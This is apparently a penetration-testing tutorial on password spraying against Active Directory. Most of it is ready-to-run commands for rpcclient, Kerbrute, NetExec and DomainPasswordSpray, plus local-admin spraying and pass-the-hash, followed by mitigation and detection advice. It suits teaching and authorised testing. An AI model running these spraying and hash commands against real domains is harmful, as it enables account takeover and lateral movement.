**Password spraying** is an authentication attack technique where **one password** is tested against **many user accounts** to avoid triggering account lockout policies.

Unlike brute force attacks:

- Many passwords → one user (high lockout risk)
    
- One password → many users (lower detection probability)
    

---

## Preconditions

Before executing internal password spraying:

- Valid user list required (`valid_users.txt`)
    
- Candidate password list or single password identified
    
- Network access to Domain Controller or internal services
    
- Understanding of domain lockout policy
    

---

## Password Spraying Using rpcclient

`rpcclient` allows SMB authentication attempts from Linux systems.

#### Key Indicator of Successful Login

A successful authentication returns:

```
Authority Name: <DOMAIN>
```

#### Bash One-Liner Attack

The following one-liner can be used to obtain a clean output.

```bash
for u in $(cat valid_users.txt); do
    rpcclient -U "$u%<password>" -c "getusername;quit" <dc_ip> | grep Authority
done
```

#### Explanation

|Component|Description|
|---|---|
|`-U "$u%<password>"`|Username + password attempt|
|`getusername`|Forces authenticated RPC request|
|`grep Authority`|Filters successful logins|

---

## Password Spraying Using Kerbrute

Kerbrute performs Kerberos authentication attempts directly against the KDC.

```bash
kerbrute passwordspray \
-d <domain> \
--dc <dc_ip> \
valid_users.txt <password>
```

#### Advantages

- Fast Kerberos-based validation
    
- Avoids SMB noise
    
- Clear success output
    

---

## Password Spraying Using NXC (NetExec)

NetExec (NXC) provides modular authentication testing.

```bash
sudo nxc smb <dc_ip> -u valid_users.txt -p <password> | grep +
```

---

## DomainPasswordSpray (Windows)

When operating from a **domain-joined Windows host**, the tool **DomainPasswordSpray.ps1** is one of the safest and most controlled methods for internal password spraying.

**Importing the Module:**

Load the tool into the current PowerShell session:

```powershell
Import-Module .\DomainPasswordSpray.ps1
```

**Executing a Password Spray:**

If authenticated to the domain, the tool automatically builds the user list from Active Directory.

```powershell
Invoke-DomainPasswordSpray `
-Password <password> `
-OutFile <output_file> `
-ErrorAction SilentlyContinue
```

**Parameter Explanation:**

|Parameter|Description|
|---|---|
|`-Password`|Single password used for spraying|
|`-OutFile`|File storing successful authentications|
|`-ErrorAction SilentlyContinue`|Suppresses noisy errors|

---

## Local Administrator Password Reuse

Password spraying also applies to **local administrator accounts**.

Common causes:

- Gold image deployments
    
- Shared administrative passwords
    
- Weak operational practices
    

It can be performed with NetExec.

```bash
sudo nxc smb --local-auth <target_subnet> \
-u administrator \
-p <password> | grep +
```

#### Local Administrator Hash Spraying (Pass-the-Hash)

If an NTLM hash is recovered from SAM, hash spraying can also be executed:

```bash
sudo nxc smb --local-auth <target_subnet> \
-u administrator \
-H <ntlm_hash> | grep +
```

---

## Mitigations

#### Multi-Factor Authentication (MFA)

- Prevents account takeover even if password is valid.
    

#### Access Restriction

- Enforce least privilege.
    
- Limit application authentication scope.
    

#### Reduce Impact

- Separate admin and user accounts.
    
- Network segmentation.
    

#### Password Hygiene

- Enforce passphrases.
    
- Block seasonal/company-name passwords.
    
- Apply password filters.
    

#### LAPS Deployment

Use Microsoft LAPS to:

- Rotate local admin passwords
    
- Enforce uniqueness per host
    

---

## Detection

#### Indicators

- Multiple login failures in short timeframe
    
- Authentication attempts across many users
    
- High login volume to a single service
    

#### Important Windows Event IDs

|Event ID|Meaning|
|---|---|
|4625|Failed logon attempts|
|4771|Kerberos pre-authentication failure|

Monitoring correlation of these events helps identify spraying activity.